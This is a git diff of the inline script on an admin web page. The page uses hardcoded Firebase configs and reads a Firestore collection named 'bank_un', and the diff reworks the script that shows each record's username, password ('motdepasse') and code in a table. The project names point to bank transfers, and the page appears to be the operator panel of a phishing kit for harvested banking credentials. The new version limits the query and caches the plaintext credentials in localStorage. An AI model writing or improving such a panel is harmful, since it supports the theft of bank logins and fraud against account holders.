@@ -182,83 +182,107 @@
         // Masquer le bouton "Aller en haut" au chargement de la page
         scrollToTopBtn.style.display = "none";
     </script>
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
-        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
-        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-auth.js";
-    
-        // Configuration Firebase
-        const firebaseConfig = {
-            apiKey: "AIzaSyAbniNRr-UbMOc_xKEjx13u1cHolSF-m74",
-            authDomain: "virement-1b287.firebaseapp.com",
-            projectId: "virement-1b287",
-            storageBucket: "virement-1b287.firebasestorage.app",
-            messagingSenderId: "8821333215",
-            appId: "1:8821333215:web:db6d5c44dc451d80c21d6a",
-            measurementId: "G-R4G25JKTCB"
-        };
-    
-        // Initialisation Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app); // Initialisation de l'authentification
-    
-        // Fonction pour récupérer et afficher les données
-        async function fetchData() {
-    // Afficher le loader avant de commencer à récupérer les données
-    document.getElementById("loading-spinner").style.display = "block";
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import { getFirestore, collection, getDocs, query, limit } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
+    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-auth.js";
 
-    try {
-        const querySnapshot = await getDocs(collection(db, "bank_un")); // Remplacez "bank_trois" par le nom de votre collection
+    // Configuration Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
+        authDomain: "virement2-bf790.firebaseapp.com",
+        projectId: "virement2-bf790",
+        storageBucket: "virement2-bf790.firebasestorage.app",
+        messagingSenderId: "965517390511",
+        appId: "1:965517390511:web:430715abd2331f0a42da5a"
+    };
+
+    // Initialisation Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const auth = getAuth(app);
+
+    // Fonction pour récupérer et afficher les données
+    async function fetchData() {
+        const loadingSpinner = document.getElementById("loading-spinner");
         const dataTable = document.getElementById("data-table");
-        
-        // Vérifier si la collection est vide
-        if (querySnapshot.empty) {
-            dataTable.innerHTML = "<tr><td colspan='5' class='text-center'>Aucune donnée trouvée</td></tr>";
-        } else {
-            querySnapshot.forEach((doc) => {
-                const data = doc.data();
-                const row = `
-                    <tr>
-                        <td>${data.id}</td>
-                        <td>${data.username}</td>
-                        <td>${data.motdepasse}</td>
-                        <td>${data.code}</td>
-                    </tr>
-                `;
-                dataTable.innerHTML += row;
-            });
-        }
-    } catch (error) {
-        console.error("Erreur lors de la récupération des données :", error);
-        document.getElementById("data-table").innerHTML = "<tr><td colspan='5' class='text-danger text-center'>Erreur de chargement des données</td></tr>";
-    } finally {
-        // Masquer le loader après le chargement des données (réussi ou échoué)
-        document.getElementById("loading-spinner").style.display = "none";
-    }
-}
-    
-        // Vérifier si l'utilisateur est connecté
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                // L'utilisateur est connecté, récupérer les données
-                fetchData();
+
+        // Afficher le loader
+        loadingSpinner.style.display = "block";
+        dataTable.innerHTML = ""; // Vider le tableau avant de charger de nouvelles données
+
+        try {
+            // Supprimer le cache à chaque chargement pour forcer une actualisation
+            localStorage.removeItem("cachedData");
+
+            // Récupérer les données depuis Firestore avec une limite de 50 documents
+            const q = query(collection(db, "bank_un"), limit(50)); // Limiter à 50 documents
+            const querySnapshot = await getDocs(q);
+
+            if (querySnapshot.empty) {
+                dataTable.innerHTML = "<tr><td colspan='4' class='text-center'>Aucune donnée trouvée</td></tr>";
             } else {
-                // Rediriger vers la page de connexion si l'utilisateur n'est pas connecté
-                window.location.href = "admin.signIn.html";
+                const data = [];
+                querySnapshot.forEach((doc) => {
+                    data.push(doc.data()); // Stocker les données dans un tableau
+                });
+
+                // Afficher les données
+                displayData(data);
+
+                // Mettre en cache les données dans localStorage
+                localStorage.setItem("cachedData", JSON.stringify(data));
             }
+        } catch (error) {
+            console.error("Erreur lors de la récupération des données :", error);
+            dataTable.innerHTML = "<tr><td colspan='4' class='text-danger text-center'>Erreur de chargement des données</td></tr>";
+        } finally {
+            // Masquer le loader
+            loadingSpinner.style.display = "none";
+        }
+    }
+
+    // Fonction pour afficher les données dans le tableau
+    function displayData(data) {
+        const dataTable = document.getElementById("data-table");
+        const tbody = dataTable.querySelector("tbody") || dataTable; // Utiliser tbody s'il existe
+        tbody.innerHTML = ""; // Vider le contenu existant
+
+        data.forEach((item) => {
+            const row = `
+                <tr>
+                    <td>${item.id}</td>
+                    <td>${item.username}</td>
+                    <td>${item.motdepasse}</td>
+                    <td>${item.code}</td>
+                </tr>
+            `;
+            tbody.innerHTML += row; // Ajouter chaque ligne au tableau
         });
-    
-        // Gestion de la déconnexion
-        document.getElementById("logout-btn").addEventListener("click", async () => {
-            try {
-                await signOut(auth);
-                window.location.href = "admin.signIn.html"; // Rediriger vers la page de connexion
-            } catch (error) {
-                console.error("Erreur de déconnexion :", error.message);
-            }
-        });
-    </script>
+    }
+
+    // Vérifier si l'utilisateur est connecté
+    onAuthStateChanged(auth, (user) => {
+        if (user) {
+            // L'utilisateur est connecté, récupérer les données
+            fetchData();
+        } else {
+            // Rediriger vers la page de connexion si l'utilisateur n'est pas connecté
+            window.location.href = "admin.signIn.html";
+        }
+    });
+
+    // Gestion de la déconnexion
+    document.getElementById("logout-btn").addEventListener("click", async () => {
+        try {
+            await signOut(auth);
+            localStorage.removeItem("cachedData"); // Supprimer le cache lors de la déconnexion
+            window.location.href = "admin.signIn.html"; // Rediriger vers la page de connexion
+        } catch (error) {
+            console.error("Erreur de déconnexion :", error.message);
+        }
+    });
+</script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js" integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy" crossorigin="anonymous"></script>
     <script src="js/bootstrap.min.js"></script>
